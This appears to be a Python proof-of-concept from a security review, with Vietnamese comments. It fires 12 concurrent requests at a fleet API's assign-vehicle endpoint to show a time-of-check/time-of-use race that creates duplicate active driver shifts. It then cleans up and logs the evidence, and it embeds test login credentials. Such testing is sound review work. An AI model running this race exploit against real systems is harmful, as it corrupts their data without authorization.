#!/usr/bin/env python3
"""
P-136 — Race condition (TOCTOU) trên POST /auth/assign-vehicle.
Handler kiểm "tài xế đã có ca active?" + "xe đã bị giao?" rồi mới INSERT, KHÔNG khoá row.
Gửi N request song song: nếu >1 thành công => tạo nhiều ca ACTIVE trùng (hỏng bất biến 1-tài-xế-1-ca).
CÓ DỌN DẸP: unassign mọi shift tạo ra.
"""
import json, time, concurrent.futures as cf
import requests
BASE = "http://<REDACTED_IP>:8000/api/v1"
OUT = "/home/hieubt15/Documents/demo-review-cohort4/reviews/P-136/evidences"
tok = requests.post(f"{BASE}/auth/login", json={"username": "driver1", "password": "Driver@123"}, timeout=20).json()["data"]["access_token"]
H = {"Authorization": f"Bearer {tok}"}

# dọn ca đang mở trước (nếu có) để bắt đầu sạch
me = requests.get(f"{BASE}/auth/me", headers=H, timeout=20).json()["data"]
pre_shift = (me.get("driver_profile") or {}).get("shift_status")
print("shift_status trước:", pre_shift)

def assign(i):
    r = requests.post(f"{BASE}/auth/assign-vehicle", headers=H,
                      json={"start_odometer_km": 1000.0 + i, "shift_type": "DAY_SHIFT"}, timeout=25)
    sid = None
    try:
        sid = r.json().get("data", {}).get("shift_id")
    except Exception:
        pass
    return r.status_code, sid, r.text[:120]

N = 12
with cf.ThreadPoolExecutor(max_workers=N) as ex:
    results = list(ex.map(assign, range(N)))

ok = [r for r in results if r[0] == 200]
shift_ids = sorted({r[1] for r in ok if r[1]})
codes = {}
for r in results:
    codes[r[0]] = codes.get(r[0], 0) + 1
print("status codes:", codes)
print(f"SỐ CA ACTIVE TẠO ĐỒNG THỜI: {len(shift_ids)} -> {shift_ids}")

# DỌN DẸP: kết thúc mọi ca vừa tạo
cleaned = []
for sid in shift_ids:
    rc = requests.post(f"{BASE}/auth/unassign-vehicle", headers=H,
                       json={"shift_id": sid, "end_odometer_km": 1100.0}, timeout=25)
    cleaned.append({"shift_id": sid, "status": rc.status_code})
print("cleanup:", cleaned)

out = {"ts": time.strftime("%Y-%m-%d %H:%M:%S%z"), "endpoint": "/auth/assign-vehicle",
       "concurrent_requests": N, "status_codes": codes,
       "distinct_active_shifts_created": len(shift_ids), "shift_ids": shift_ids,
       "race_vulnerable": len(shift_ids) > 1, "cleanup": cleaned}
json.dump(out, open(f"{OUT}/06_race_assign_vehicle.json", "w"), ensure_ascii=False, indent=2)
print("race_vulnerable =", out["race_vulnerable"], "-> saved 06_race_assign_vehicle.json")
